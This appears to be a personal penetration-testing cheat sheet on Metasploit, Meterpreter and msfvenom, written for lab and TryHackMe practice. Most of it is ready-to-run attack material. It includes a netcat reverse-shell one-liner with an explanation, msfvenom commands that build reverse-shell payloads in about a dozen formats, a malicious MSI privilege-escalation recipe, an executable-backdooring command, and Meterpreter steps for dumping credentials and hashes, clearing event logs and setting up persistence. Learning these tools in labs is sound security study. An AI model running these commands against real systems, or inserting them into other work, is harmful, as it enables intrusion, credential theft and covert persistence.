# Using Metasploit
## Console (“msfconsole”)
Basic Metasploit flow:

* `use $MODULE_NAME`
* `set $OPTIONS`
* `run`

You can use msfconsole as a shell, but there’s no redirect functionality.

### Commands
* `back` — exit the current module
* `db_nmap $FLAGS $IP` — run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
* `help` — get metasploit help
* `history` — display command history
* `hosts` — display known hosts in DB
* `hosts -d` — delete saved hosts from DB
* `info` — show module information (including exploit target options)
* `jobs` — check the status of background jobs
* `options` (`advanced`)- show module/exploit options (or “advanced” options)
* `run`/`exploit` — run the selected exploit
* `run -j` — run the selected exploit as a background job
* `search` — search modules; query to a particular type of module using the `type:` parameter (e.g., `search type:exploit wordpress`)
* `services` — display services discovered in known hosts in DB
* `sessions` — list open Meterpreter sessions on a box
* `sessions -i $SESSION_NUMER` — connect to Meterpreter session `$SESSION_NUMBER`
* `show auxiliary` — show auxiliary modules, filtered by relevancy if called from within a module
* `show exploits` — show exploit modules
* `show options` — show module options
* `show payloads` — show payload modules, filtered by relevancy if called from within a module
* `spool` — save all console output to a log file (useful for record-keeping)
* `use` — select a Metasploit module/exploit
* `vulns` — display vulnerabilities discovered in known hosts in DB
* `workspace` — use workspaces; keeps database results isolated per engagement

Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you don’t have to worry about backgrounding the entire msfconsole).

#### Additional Resources
* [Using “nmap”](./Using%20%22nmap%22.md)

### Modules
Module categories:

* Auxiliary (odds-n-ends)
* Encoders (re-encode exploits to thwart signature-based anti-malware solutions)
* Evasion (attempt to directly evade anti-malware solutions)
* Exploits
* NOPS (no-op code that can be used to pad exploits to a needed size)
* Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)
* Post (additional post-exploitation tools)

Note that Metasploit 6 apparently calls these “framework plugins” now.

* **Remember:** Open up the port Metasploit’s going to use in your firewall *before* running the exploit. Generally this is port 4444 by default (set with LPORT).
* **Also Remember:** Be sure to set `LHOST` (and, when applicable, `SRVHOST`) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving `SRVHOST` at the default of 0.0.0.0.)
* **Also ALSO Remember:** Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you’re trying to exploit a service that’s not exposed externally in order to elevate your privileges). When doing this, remember that `LHOST` is still your machine’s external address, as the exploit won’t be connecting back over the SSH tunnel (obviously)! Since `LHOST` is also used to determine where the exploit’s listener binds to, it’s sometimes necessary to set the optional `ReverseListenerBindAddress` in these cases (typically when you do this, `LHOST` will be some remote system you’re tunneled into, and `ReverseListenerBindAddress` will be 127.0.0.1).

#### Additional Resources
* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)

### Module Options
The common `RHOSTS` option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).

Most modules support the `ARCH`, `PAYLOAD`, and `SESSION` options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are *not* shown when running `show options`.

You can reset individual parameters using `unset`, and reset the entire module using `unset all`.

Equivalent module commands:

* `set -g` = `setg`
* `unset -g` = `unsetg`
* `run` = `exploit`

Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many *don’t* have a check at all. YMMV!

### Scanners
Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.

Targeted scanners can be more useful, however:

* The `auxiliary/scanner/discovery/udp_sweep` module will probe for common UDP services.
* The `auxiliary/scanner/http/http_version` module will give you HTTP server version information.
* The `auxiliary/scanner/smb/smb_login` module will allow you to conduct brute-force and password spraying attacks against Samba logins.

Metasploit has a variety of Samba/CIFS scanners too (use `search scanner/smb` to list them), as well as modules for basic enumeration such as `smtp_version`/`smtp_enum` (for SMTP) and `mysql_sql` (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).

#### Additional Resources
* [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
* [TryHackMe: Password Attacks](https://tryhackme.com/room/passwordattacks)

### Payloads
Payloads can be divided into:

* Singles (self-contained; also indicated by the use of an `_` separating “shell” from the rest of the payload name, as in `shell_reverse_tcp`)
* Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)
* Stages (payloads designed to be downloaded by a stager; also indicated by the use of a `/` separating “shell” from the rest of the payload name, as in `shell/reverse_tcp`)

Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).

**Note:** Metasploit defaults to sending 32-bit payloads, but an increasing number of things won’t work on a 64-bit system from a 32-bit meterpreter shell. It’s probably best to explicitly set the `payload` option to use a 64-bit payload unless you *know* that you’ll be dealing with a 32-bit system.

List all available payloads using `msfvenom --list payloads` or `show payloads` from within the Metasploit console.

A specific payload can be set in the Metasploit console use the `set PAYLOAD full/path/to/payload`.

If you initially get a native shell, use the `post/multi/manage/shell_to_meterpreter` module to upgrade to Meterpeter. (NOTE: `shell_to_meterpreter` creates a new connection on a new port, by default 4433.)

#### Additional Resources
* [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
* [Metasploit — Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)

## Meterpreter
The Meterpreter reverse shell *requires* a connection back to msfconsole using multi/handler.

### Commands
* `background` — background the current session and return to the Metasploit console
* `clearenv` — clears the (Windows) event logs (kinda obvious)
* `creds_all` — dump all user credentials in memory (requires the `kiwi` module)
* `download` — transfer a file from the target to the attacker
* `edit` — edit a file
* `getpid` — get current process ID
* `getprivs` — display current user privileges
* `getsystem` — attempt to elevate to SYSTEM/root
* `getuid` — get current process user
* `golden_ticket_create` — create a golden ticket (requires the `kiwi` module)
* `guid` — get session ID
* `hashdump` — dump NTLM hashes from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash
* `ifconfig` — display host network interface information
* `info` — get information about a Meterpreter extension
* `load` — load Meterpreter extension
* `load kiwi` — load Mimikatz extension
* `migrate` — migrate Meterpreter to another process
* `netstat` — display host network connections
* `portfwd` — forward a port on the host
* `route` — mess with the host routing tables
* `run` — run a meterpreter extension
* `search` — search for files
* `sessions` — switch to another (Metasploit) session
* `shell` — drop to system shell (return to Meterpreter using `CTRL + Z`)
* `sysinfo` — pull remote system information
* `upload` — transfer a file from the attacker to the target

Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.

The `sessions` command is also used to connect to meterpreter sessions that have been caught after a successfully executed exploit.

### Modules
Potentially useful Metsploit modules to `run` from/besides Meterpreter:

* `post/windows/gather/checkvm` — try to determine if we’re in a VM
* `post/multi/recon/local_exploit_suggester` — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)
* `post/windows/gather/enum_shares` — enumerate shares
* `auxiliary/scanner/smb/smb_enumusers_domain` — enumerate SMB domain users (requires existing admin credentials)
* `post/windows/gather/hashdump` — same as the hashdump command, but pushes the hashes into the Metasploit DB
* `post/windows/gather/smart_hashdump GETSYSTEM=FALSE` — same as the hashdump command, but pushes the hashes into the Metasploit DB and ignores system accounts
* `auxiliary/analyze/crack_windows` — sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB
* `post/windows/manage/enable_rdp` — enable RDP access (requires admin privileges)
* `post/multi/manage/autoroute` — manipulate target routing for pivoting
* `auxiliary/server/socks_proxy` — start a SOCKS proxy
* `exploit/windows/local/persistence` — sets up a persistent connection (you probably want to `set STARTUP SYSTEM`)… *without a password!*

**Note:** It is generally more useful to background Meterpreter and then run these commands through the Metasploit console, as within Meterpreter they need to have all options specified on the “run” command line (in the console you can access help, actually *see* what the options are, etc.).

There seem to be a lot of options for the `post/multi/manage/autoroute` and `auxiliary/server/socks_proxy` modules, but I don’t see a way to access them from Meterpreter (it looks like to get help you need to background Meterpreter and use the console).

The advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that you’re attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)

#### Additional Resources
* [Using John the Ripper](./Using%20John%20the%20Ripper.md)
* [Using Hashcat](./Using%20Hashcat.md)
* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
* [Windows Password Hashes](./Windows%20Password%20Hashes.md)

### Loading PowerShell
```meterpreter
load powershell
powershell_shell
```

*Don’t* try to exit PowerShell — trying to do this produces consistent hangs for me. Instead, background the process with `^Z`.

### Using Mimikatz
Use `load kiwi` to load up Mimikatz. Sub-commands:

```meterpreter
kerberos         # Attempt to retrieve kerberos creds
livessp          # Attempt to retrieve livessp creds
mimikatz_command # Run a custom commannd
msv              # Attempt to retrieve msv creds (hashes)
ssp              # Attempt to retrieve ssp creds
tspkg            # Attempt to retrieve tspkg creds
wdigest          # Attempt to retrieve wdigest creds
```

#### Additional Resources
* [Using Mimikatz](./Using%20Mimikatz.md)
* [Kerberos](./Kerberos.md)

### Log In as a User
```meterpreter
load incognito
list_tokens -u
impersonate_token $DOMAIN\\$USER
```

Not 100% sure where the “tokens” come from here… Mimikatz, maybe?

### Process Migration
I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.

Reasons to migrate the Meterpreter process:

* For persistence (pick a long-running process)
* To make sure that the Meterpreter *process* has system privileges
* To hide (pick a process less likely to be examined)
* To stabilize the shell (initial exploits often produce somewhat unstable sessions)
* To move laterally or escalate privileges within a system (if you’re lucky)
* To gain additional capabilities

In particular, harvesting credentials from LSASS requires that Meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating Meterpreter can help us realize this. The print spooler service (`spoolsv.exe`) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use `lsass.exe` directly if you feel like living dangerously.

Another example is that dumping keystrokes will only work when Meterpreter is attached to a word processor or text editor.

Note that Meterpreter will happily let you migrate from a privileged to an unprivileged process — which may cause you to loose control of the target system! Additionally, migrating Meterpreter will change its current working directory to that of the process it’s attaching to.

Executing `run post/windows/manage/migrate` will cause Meterpreter to try to migrate to another process in an automated fashion. I’m not sure how “smart” this is in practice.

#### Additional Resources
* [How does process migration work in Meterpreter](https://security.stackexchange.com/a/92893)
* [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
* [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
* [TryHackMe: Weaponization](https://tryhackme.com/room/weaponization)

## Venom (“msfvenom”)
Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:

```bash
# Use Metasploit to generate the code for a remote shell:
# 
msfvenom -p cmd/unix/reverse_netcat \
            lhost=$LOCAL_IP lport=$LOCAL_PORT

# Spin up a listener using netcat:
#
nc -lvp $LOCAL_PORT
```

This will generates code that looks like this:

```bash
mkfifo /tmp/qdsrgu; \
nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
	/bin/sh >/tmp/qdsrgu 2>&1; \
rm /tmp/qdsrgu
```

What’s going on here?

* `mkfifo /tmp/qdsrgu` creates a named pipe at /tmp/qdsrgu.
* We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
* On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.

Use `--list formats` to see available encoding formats.

```bash
# 32-bit Linux ELF Meterpreter payload
#
msfvenom -p linux/x86/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f elf -o revshell

# 32-bit macOS MACH-O Meterpreter payload
#
msfvenom -p osx/x86/shell_reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f macho -o revshell

# 32-bit (?) Windows executable Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe -o revshell.exe

# 32-bit (?) Windows SERVICE executable (note that these
# require additional API calls to work, beyond what `-f exe`
# provides)
#
msfvenom -p windows/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe-service \
	                                  -o revshell.exe

# PHP Meterpreter payload
#
msfvenom -p php/meterpreter_reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o revshell.php

# ASP Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f asp -o revshell.asp

# JSP Meterpreter payload
#
msfvenom -p java/jsp_shell_reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o revshell.jsp

# Python Meterpreter payload
#
msfvenom -p cmd/unix/reverse_python \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o revshell.py

# Bash Meterpreter payload
#
msfvenom -p cmd/unix/reverse_bash \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o revshell.sh

# Perl Meterpreter payload
#
msfvenom -p cmd/unix/reverse_perl \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o revshell.pl

# HTA Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f hta-psh -o revshell.hta

# VBA Meterpreter payload
#
# Note that this can't be used as-is, but must first be copied
# into a Microsoft Office document as a macro. The generated
# code hooks the Workbook_Open() function, but this must be
# changed to Document_Open() for Word.
#
msfvenom -p windows/meterpreter/reverse_tcp \
	LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f vba -o revshell.vba
```

System-specific shell codes can also be produced by appropriately varying the `-f` option.

#### Additional Resources
* [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
* [TryHackMe: Weaponization](https://tryhackme.com/room/weaponization)
* [Exploiting HTML Applications](./Exploiting%20HTML%20Applications.md)
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

### 32-Bit Windows Programs
By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.

#### Additional Resources
* [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)

### Malicious MSI Files
If `AlwaysInstallElevated`  is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious MSI file with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
		-f msi -o $INSTALLER.msi
```

Then install on the target to get a shell:

```powershell
msiexec /quiet /qn /i $INSTALLER.msi
```

#### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

### Backdooring Executables
```bash
msfvenom -a x64 --platform windows -x $UNMODIFIED_EXE_NAME \
         -k -p windows/x64/shell_reverse_tcp \
         LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
         -b "\x00" -f exe -o $BACKDOOR_EXE_NAME
```

#### Additional Resources
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 

## Catching Shells
Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using msfvenom. Note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching — for example, `windows/meterpreter/reverse_tcp`. We can catch both regular reverse shells and meterpreter sessions this way.

### Additional Resources
* [TryHackMe: Weaponization](https://tryhackme.com/room/weaponization)
